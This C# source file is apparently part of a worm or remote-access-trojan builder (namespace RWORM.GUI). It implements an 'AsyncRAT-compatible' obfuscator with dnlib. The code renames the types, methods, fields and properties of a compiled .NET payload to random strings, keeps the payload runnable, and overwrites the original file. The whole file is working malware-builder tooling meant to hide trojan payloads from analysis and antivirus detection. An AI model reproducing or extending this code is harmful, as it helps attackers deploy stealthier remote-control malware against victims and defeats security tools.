using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace RWORM.GUI.RenamingObfuscation
{
    /// <summary>
    /// AsyncRAT-compatible symbol and metadata obfuscator based on dnlib.
    /// Renames namespaces, classes, methods, properties, and fields into randomized identifier tokens
    /// while safely preserving entry points, P/Invoke signatures, runtime models, and overrides.
    /// </summary>
    public static class Obfuscator
    {
        private static readonly Random _rng = new();
        private const string Alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        public static string GenerateRandomString(int minLen = 10, int maxLen = 18)
        {
            int len = _rng.Next(minLen, maxLen + 1);
            var sb = new StringBuilder(len);
            // Ensure first character is a valid identifier letter
            sb.Append(Alphabet[_rng.Next(Alphabet.Length)]);
            for (int i = 1; i < len; i++)
            {
                sb.Append(Alphabet[_rng.Next(Alphabet.Length)]);
            }
            return sb.ToString();
        }

        public static void ObfuscateAssembly(string filePath)
        {
            if (!File.Exists(filePath)) throw new FileNotFoundException("Assembly not found", filePath);

            var modCtx = ModuleDef.CreateModuleContext();
            var module = ModuleDefMD.Load(filePath, modCtx);

            try
            {
                var typeMap = new Dictionary<string, string>();
                var methodMap = new Dictionary<string, string>();
                var fieldMap = new Dictionary<string, string>();

                // 1. Rename Namespaces & Types
                foreach (TypeDef type in module.GetTypes())
                {
                    if (type.IsGlobalModuleType || type.IsSpecialName || type.IsRuntimeSpecialName)
                        continue;

                    // Preserve entry point class, WPF generated helpers, resources
                    if (type.Name.Contains("<") || type.Name.Contains("Program") ||
                        type.Name == "GeneratedInternalTypeHelper" || type.Name == "Resources")
                        continue;

                    string newTypeName = GenerateRandomString(12, 20);
                    typeMap[type.Name] = newTypeName;
                    type.Name = newTypeName;

                    if (!string.IsNullOrEmpty(type.Namespace))
                    {
                        type.Namespace = GenerateRandomString(8, 14);
                    }
                }

                // 2. Rename Methods (excluding Main, constructors, P/Invokes, interface implementations, virtual overrides)
                foreach (TypeDef type in module.GetTypes())
                {
                    if (type.IsGlobalModuleType) continue;

                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.IsConstructor || method.IsStaticConstructor) continue;
                        if (method.IsSpecialName || method.IsRuntimeSpecialName) continue;
                        if (method.IsPinvokeImpl || method.HasImplMap) continue;
                        if (method.IsVirtual || method.IsAbstract) continue;
                        if (method.Name == "Main" || method.Name.StartsWith("<")) continue;

                        string newMethodName = GenerateRandomString(10, 16);
                        methodMap[method.Name] = newMethodName;
                        method.Name = newMethodName;
                    }
                }

                // 3. Rename Fields
                foreach (TypeDef type in module.GetTypes())
                {
                    if (type.IsGlobalModuleType) continue;

                    foreach (FieldDef field in type.Fields)
                    {
                        if (field.IsSpecialName || field.IsRuntimeSpecialName) continue;
                        if (field.Name.StartsWith("<") || field.Name == "value__") continue;

                        string newFieldName = GenerateRandomString(8, 14);
                        fieldMap[field.Name] = newFieldName;
                        field.Name = newFieldName;
                    }
                }

                // 4. Rename Properties
                foreach (TypeDef type in module.GetTypes())
                {
                    if (type.IsGlobalModuleType) continue;

                    foreach (PropertyDef prop in type.Properties)
                    {
                        if (prop.IsSpecialName || prop.IsRuntimeSpecialName) continue;
                        if (prop.Name.StartsWith("<")) continue;

                        prop.Name = GenerateRandomString(8, 14);
                    }
                }

                // Write modified assembly back to disk
                string tempOut = filePath + ".obf.tmp";
                module.Write(tempOut);
                module.Dispose();
                module = null;

                File.Delete(filePath);
                File.Move(tempOut, filePath);
            }
            finally
            {
                module?.Dispose();
            }
        }
    }
}
